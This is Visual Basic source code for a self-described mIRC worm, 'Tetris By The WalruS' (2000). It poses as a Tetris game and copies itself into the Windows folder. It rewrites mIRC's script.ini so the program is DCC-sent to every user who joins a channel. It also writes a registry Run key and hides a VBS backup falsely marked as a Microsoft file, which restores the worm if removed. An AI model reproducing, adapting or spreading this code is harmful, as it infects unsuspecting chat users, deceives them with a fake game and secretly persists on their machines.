Attribute VB_Name = "Module1"

' Tetris By The WalruS
' mIRC Worm
' Version 1.00  10/2000

Sub Main()

    On Error Resume Next

    Dim installation As String ' Declare installation Variable
    installation = "" ' Set installation Variable

    ' Check To See If IRC Is Installed In C default
    Installed1 = Dir("C:\mirc\mirc32.exe")
    If Installed1 <> "" Then
        installation = "C:\mirc\"
        Call Infecter(installation)
    End If
    
    ' Check To See If IRC Is Installed In C Program Files
    Installed2 = Dir("C:\Program Files\mirc\mirc32.exe")
    If Installed2 <> "" Then
        installation = "C:\Program Files\mirc\"
        Call Infecter(installation)
    End If
    
    ' Check To See If IRC Is Installed In D default
    Installed3 = Dir("D:\mirc\mirc32.exe")
    If Installed3 <> "" Then
        installation = "D:\mirc\"
        Call Infecter(installation)
    End If
    
    ' Check To See If IRC Is Installed In D Program Files
    Installed4 = Dir("D:\Program Files\mirc\mirc32.exe")
    If Installed4 <> "" Then
        installation = "D:\Program Files\mirc\"
        Call Infecter(installation)
    End If
    
    ' If mIRC Isnt Installed Anywhere Then Lets Just Play Tetris
    If installation = "" Then
        Call TetrisGame
    End If
    
End Sub
    
Sub Infecter(installation)
    
    On Error Resume Next
    
    ' Copy This File To Windows
    Dim SourceFile, DestinationFile
    SourceFile = "Tetris.exe"
    DestinationFile = "C:\Windows\System.exe"
    FileCopy SourceFile, DestinationFile
    
    ' Run Spreading Routine
    Call IRCSpreader(installation)
    
    ' Make Dropped VBS File Run Upon Reboot
    Call CreateRunReg
    
    ' Drop A VBS File In Case User Removes Tetris.exe Or Script.ini
    Call DropVBS(installation)
    
    ' Play Tetris
    Call TetrisGame

End Sub
    
' Spread On IRC Chat
Sub IRCSpreader(installation)
    On Error Resume Next
    Kill installation & "script.ini" ' Kill existing Script
    Open "C:\Windows\script.bak" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick C:\Tetris.exe }"
    Close #1
End Sub

' Make Registry Entry To Make Dropped File Run Upon Reboot
Function CreateRunReg()
    On Error Resume Next
    Open "c:\run.reg" For Output As 1
        Print #1, "REGEDIT4"
        Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
        Print #1, """SysFile""=""\""C:\\Backup.vbs\"""""
    Close 1
    Shell "regedit /s c:\run.reg"
    Kill "c:\run.reg"
End Function

' Drop VBS Backup File
Function DropVBS(installation)
    On Error Resume Next
    Open "C:\Backup.vbs" For Output As #1
        Print #1, "' Backup.vbs System File (c) Microsoft Corporation 2000"
        Print #1, "On Error Resume Next"
        Print #1, "Dim fso, fbackup, sbackup"
        Print #1, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
        Print #1, "Set fbackup = fso.GetFile(""C:\Windows\System.exe"")"
        Print #1, "fbackup.Copy(""C:\Tetris.exe"")"
        Print #1, "Set sbackup = fso.GetFile(""C:\Windows\Script.bak"")"
        Print #1, "sbackup.Copy(""" & installation & "Script.ini"")"
    Close #1
    SetAttr ("C:\Backup.vbs"), 6 ' Lets Hide This
End Function

' Play Tetris :-)
Sub TetrisGame()
    On Error Resume Next
    Tetris2.Show
End Sub

' Wally The WalruS Thanx Ya!